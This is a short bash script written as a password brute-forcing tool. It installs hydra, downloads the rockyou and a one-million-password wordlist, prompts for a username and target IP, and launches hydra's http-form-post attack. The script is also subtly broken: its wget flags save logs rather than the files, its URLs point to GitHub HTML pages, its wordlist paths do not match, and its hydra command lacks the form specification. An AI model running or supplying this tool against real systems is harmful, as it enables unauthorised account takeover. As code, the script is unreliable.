#!/bin/bash
#
# Author: Joseph Hurley
# Purpose: Password brute-forcing

# ANSI escape Codes (for colored output, -e required on echo)
RED='\033[0;31m'
GREEN='\u001b[32m'
NC='\033[0m' # No Color

# install required packages
echo -e "downloading reqired packages..."
sudo apt install hydra

# create directories
mkdir ~/pwbruteforcer
mkdir ~/pwbruteforcer/wordlists

# download and unpack wordlists
echo -e "$GREEN""downloading wordlists""$NC"
wget -q https://github.com/Sephley/Hydra/blob/main/wordlists/rockyou.txt.gz -o ~/pwbruteforcer/wordlists
wget -q https://github.com/Sephley/Hydra/blob/main/wordlists/1milpwlist.txt -o ~/pwbruteforcer/wordlists
echo -e "$GREEN""de-compressing wordlists""$NC"
gzip -dc wordlists/rockyou.txt.gz > ~/pwbruteforcer/wordlists/rockyou.txt

echo -e "$GREEN""enter username: ""$NC"
read -r USERNAME

echo -e "$GREEN""type your destined IP-Address: ""$NC"
read -r IPADDRESS

# variables for wordlists
ROCKYOU='rockyou.txt'
ONEMILPWLIST='1milpwlist.txt'

echo -e "$GREEN""select the wordlist you would like to use\n""$NC"
select d in rockyou.txt 1milpwlist.txt; 
do test -n "$d" && break; 
echo -e "$RED>>> Invalid Selection""$NC"; done

if [ "$REPLY" == 1 ] ;
then echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlist/$ROCKYOU "$IPADDRESS" -V http-form-post
else echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlist/$ONEMILPWLIST "$IPADDRESS" -V http-form-post
fi

# use pw-inspector to filter?
